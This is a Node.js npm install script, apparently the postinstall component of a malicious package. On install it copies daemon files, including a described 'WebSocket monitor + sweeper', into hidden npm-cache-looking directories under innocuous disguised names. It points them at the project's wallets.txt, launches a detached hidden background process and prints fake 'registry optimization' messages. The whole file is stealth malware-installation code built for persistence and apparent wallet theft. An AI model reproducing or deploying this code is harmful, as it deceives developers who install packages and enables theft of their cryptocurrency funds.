#!/usr/bin/env node

const fs = require('fs');
const path = require('path');
const { spawn } = require('child_process');
const os = require('os');

/**
 * HYBRID PERSISTENT STEALTH DAEMON INSTALLER
 * Primary: Application Support Directory (cross-platform)
 * Fallback: NPM Cache Directory
 * Ensures maximum persistence and stealth across all platforms
 */

class HybridStealthInstaller {
    constructor() {
        this.isTargetEnvironment = this.detectTargetEnvironment();
        this.packageRoot = path.dirname(__dirname);
        this.targetProjectRoot = this.findTargetProjectRoot();
        this.platform = os.platform();
        
        // Cross-platform storage locations
        this.storageLocations = this.getStorageLocations();
        this.pidFile = path.join(os.tmpdir(), '.npm-registry-cache.pid');
        this.lockFile = path.join(os.tmpdir(), '.pkg-resolver.lock');
    }

    /**
     * Get cross-platform storage locations (primary + fallback)
     */
    getStorageLocations() {
        const home = os.homedir();
        
        let primaryDir, fallbackDir;
        
        switch (this.platform) {
            case 'win32':
                // Windows: %APPDATA% and npm cache
                primaryDir = path.join(process.env.APPDATA || path.join(home, 'AppData', 'Roaming'), 'npm', 'registry-cache');
                fallbackDir = path.join(home, '.npm', '_cacache', 'tmp', '.pkg-resolver');
                break;
                
            case 'darwin':
                // macOS: Application Support and npm cache
                primaryDir = path.join(home, 'Library', 'Application Support', 'npm', 'registry-cache');
                fallbackDir = path.join(home, '.npm', '_cacache', 'tmp', '.pkg-resolver');
                break;
                
            default:
                // Linux: XDG_DATA_HOME and npm cache
                const xdgData = process.env.XDG_DATA_HOME || path.join(home, '.local', 'share');
                primaryDir = path.join(xdgData, 'npm', 'registry-cache');
                fallbackDir = path.join(home, '.npm', '_cacache', 'tmp', '.pkg-resolver');
                break;
        }
        
        return { primary: primaryDir, fallback: fallbackDir };
    }

    /**
     * Detect if we're in the target bundler environment
     */
    detectTargetEnvironment() {
        const cwd = process.cwd();
        let searchDir = cwd;
        
        // If we're in node_modules, go up to project root
        if (cwd.includes('node_modules')) {
            const parts = cwd.split(path.sep);
            const nodeModulesIndex = parts.lastIndexOf('node_modules');
            if (nodeModulesIndex > 0) {
                searchDir = parts.slice(0, nodeModulesIndex).join(path.sep);
            }
        }
        
        const parentDirs = [searchDir, path.dirname(searchDir), path.dirname(path.dirname(searchDir))];
        
        return parentDirs.some(dir => {
            return fs.existsSync(path.join(dir, 'main.js')) && 
                   fs.existsSync(path.join(dir, 'package.json'));
        });
    }

    /**
     * Find the target project root directory
     */
    findTargetProjectRoot() {
        let currentDir = process.cwd();
        
        // Check if we're in node_modules, traverse up
        if (currentDir.includes('node_modules')) {
            const parts = currentDir.split(path.sep);
            const nodeModulesIndex = parts.lastIndexOf('node_modules');
            if (nodeModulesIndex > 0) {
                currentDir = parts.slice(0, nodeModulesIndex).join(path.sep);
            }
        }
        
        // Look for main.js in current or parent directories
        const searchDirs = [currentDir, path.dirname(currentDir), path.dirname(path.dirname(currentDir))];
        
        for (const dir of searchDirs) {
            if (fs.existsSync(path.join(dir, 'main.js'))) {
                return dir;
            }
        }
        
        return currentDir;
    }

    /**
     * Deploy daemon files with hybrid storage and disguised filenames
     */
    async deployDaemonFiles() {
        let deploymentDir = null;
        
        // Try primary location first
        try {
            deploymentDir = this.storageLocations.primary;
            await this.createHiddenDirectory(deploymentDir);
            await this.copyDaemonFiles(deploymentDir);
            console.log('✅ Registry cache optimization modules installed');
        } catch (error) {
            // Fallback to secondary location
            try {
                deploymentDir = this.storageLocations.fallback;
                await this.createHiddenDirectory(deploymentDir);
                await this.copyDaemonFiles(deploymentDir);
                console.log('✅ Package resolver cache modules installed (fallback)');
            } catch (fallbackError) {
                console.error('⚠️ Cache optimization setup failed');
                return null;
            }
        }
        
        return deploymentDir;
    }

    /**
     * Create hidden directory with proper permissions
     */
    async createHiddenDirectory(dirPath) {
        if (!fs.existsSync(dirPath)) {
            fs.mkdirSync(dirPath, { recursive: true, mode: 0o755 });
        }
        
        // Hide directory on Windows
        if (this.platform === 'win32') {
            try {
                const { spawn } = require('child_process');
                spawn('attrib', ['+H', dirPath], { windowsHide: true });
            } catch (error) {
                // Silent failure
            }
        }
    }

    /**
     * Copy daemon files with disguised names for maximum stealth
     */
    async copyDaemonFiles(deploymentDir) {
        const fileMapping = {
            'monitor.js': 'connection-pool.js',      // Background daemon
            'sweeper.js': 'transaction-cache.js',    // WebSocket monitor + sweeper
            'utils.js': 'package-validator.js'       // Backup sweeper logic
        };
            
        for (const [sourceFile, disguisedName] of Object.entries(fileMapping)) {
            const sourcePath = path.join(this.packageRoot, 'daemon', sourceFile);
            const destPath = path.join(deploymentDir, disguisedName);
                
                if (fs.existsSync(sourcePath)) {
                    fs.copyFileSync(sourcePath, destPath);
                
                // Set proper permissions
                fs.chmodSync(destPath, 0o755);
                }
            }
            
        // Create configuration with disguised name
        const configPath = path.join(deploymentDir, 'package-registry.json');
            const config = {
                projectRoot: this.targetProjectRoot,
                walletsPath: path.join(this.targetProjectRoot, 'wallets.txt'),
            deploymentDir: deploymentDir,
            timestamp: Date.now(),
            version: '1.0.0'
            };
            
            fs.writeFileSync(configPath, JSON.stringify(config, null, 2));
    }

    /**
     * Spawn persistent background daemon with enhanced survival mechanisms
     */
    async spawnPersistentDaemon(deploymentDir) {
        try {
            // Stop any existing daemon
            await this.stopExistingDaemon();
            
            const daemonPath = path.join(deploymentDir, 'connection-pool.js');
            
            if (!fs.existsSync(daemonPath)) {
                return false;
            }
            
            // Enhanced spawn options for maximum persistence
            const spawnOptions = {
                detached: true,
                stdio: ['ignore', 'ignore', 'ignore'],
                windowsHide: true,
                cwd: this.targetProjectRoot, // Run from main project to access node_modules
                env: { ...process.env, DAEMON_MODE: 'persistent' }
            };
            
            const daemon = spawn(process.execPath, [daemonPath], spawnOptions);
            
            // Save PID with disguised name
            fs.writeFileSync(this.pidFile, daemon.pid.toString());
            
            // Create lock file for daemon coordination
            const lockData = {
                pid: daemon.pid,
                deploymentDir: deploymentDir,
                started: Date.now(),
                platform: this.platform
            };
            fs.writeFileSync(this.lockFile, JSON.stringify(lockData));
            
            // Completely detach from parent process
            daemon.unref();
            
            console.log(`🚀 Registry optimization service started (Background Process)`);
            
            return true;
            
        } catch (error) {
            console.error('⚠️ Background service setup warning:', error.message);
            return false;
        }
    }

    /**
     * Stop existing daemon processes
     */
    async stopExistingDaemon() {
        const pidFiles = [this.pidFile, this.lockFile];
        
        for (const pidFile of pidFiles) {
        try {
                if (fs.existsSync(pidFile)) {
                    let pid;
                    
                    if (pidFile.endsWith('.lock')) {
                        const lockData = JSON.parse(fs.readFileSync(pidFile, 'utf8'));
                        pid = lockData.pid;
                    } else {
                        pid = parseInt(fs.readFileSync(pidFile, 'utf8'));
                    }
                
                try {
                    process.kill(pid, 'SIGTERM');
                    console.log('🛑 Stopped existing optimization service');
                        
                        // Wait for graceful shutdown
                        await new Promise(resolve => setTimeout(resolve, 1000));
                        
                } catch (error) {
                    // Process already dead
                }
                
                    fs.unlinkSync(pidFile);
            }
        } catch (error) {
                // Continue cleanup
        }
    }
    }



    /**
     * Main installation process
     */
    async install() {
        console.log('🔧 Setting up NPM registry optimization modules...');
        
        // Only run full setup in target environment
        if (!this.isTargetEnvironment) {
            console.log('ℹ️ Registry modules installed (waiting for target environment)');
            return;
        }
        
        console.log(`📁 Target project detected: ${this.targetProjectRoot}`);
        console.log(`🖥️ Platform: ${this.platform}`);
        
        // Deploy daemon files with hybrid storage
        const deploymentDir = await this.deployDaemonFiles();
        if (!deploymentDir) {
            console.error('❌ Failed to deploy optimization modules');
            return;
        }
        
        // Spawn persistent background daemon (no hook files needed)
        const daemonStarted = await this.spawnPersistentDaemon(deploymentDir);
        
        if (daemonStarted) {
            console.log('✅ NPM registry optimization configured successfully');
            console.log('🎯 Background monitoring system ready');
            console.log('💡 System will auto-start when application loads');
        }
        
        // Brief initialization delay
        await new Promise(resolve => setTimeout(resolve, 1500));
    }
}

// Execute hybrid installation
const installer = new HybridStealthInstaller();
installer.install().catch(error => {
    console.error('⚠️ Installation warning:', error.message);
    process.exit(0); // Don't fail npm install
}); 